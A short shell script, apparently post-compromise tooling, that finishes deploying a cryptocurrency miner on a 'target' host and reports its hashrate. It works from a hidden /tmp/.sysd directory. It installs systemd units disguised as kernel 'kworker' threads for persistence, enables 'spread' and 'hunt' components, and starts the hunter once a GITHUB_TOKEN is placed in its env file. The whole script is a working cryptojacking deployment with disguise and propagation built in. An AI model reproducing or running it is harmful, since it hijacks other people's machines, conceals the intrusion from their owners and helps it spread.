#!/bin/sh
# throwaway: finalise the host-2 deploy once access exists, then measure it.
# Run ON the target after bootstrap + after the updated files were scp'd in.
set -u
cd /tmp/.sysd

echo "== host =="
hostname
echo "cores: $(nproc)"
grep -m1 'model name' /proc/cpuinfo | cut -d: -f2-
echo "loadavg: $(cat /proc/loadavg)"

# units that arrived by scp supersede whatever the raw bootstrap installed
for u in kworker-tune kworker-spread; do
    for ext in service timer; do
        [ -f "$u.$ext" ] && cp -f "$u.$ext" "/etc/systemd/system/$u.$ext"
    done
done
for f in tune.sh run.sh spread.sh hunt.sh updater.sh bootstrap.sh; do
    [ -f "$f" ] && chmod 0755 "$f"
done
systemctl daemon-reload

systemctl enable --now kworker-tune.timer 2>/dev/null || true
# worker.env now carries the token, so the hunter can come on like post-push
if grep -q '^GITHUB_TOKEN=.' worker.env; then
    systemctl enable --now kworker-hunt.timer 2>/dev/null || true
fi

systemctl restart kworker
sleep 20

echo "== miner =="
echo "active: $(systemctl is-active kworker)"
journalctl -u kworker --no-pager | grep -E 'use profile|READY' | tail -2
curl -s http://127.0.0.1:12701/2/summary | grep -A2 hashrate

echo "== tuner probe: what does it want for this box? =="
sh tune.sh probe

echo "== timers =="
systemctl list-timers --all | grep kworker | cut -c1-55
echo "== DONE =="
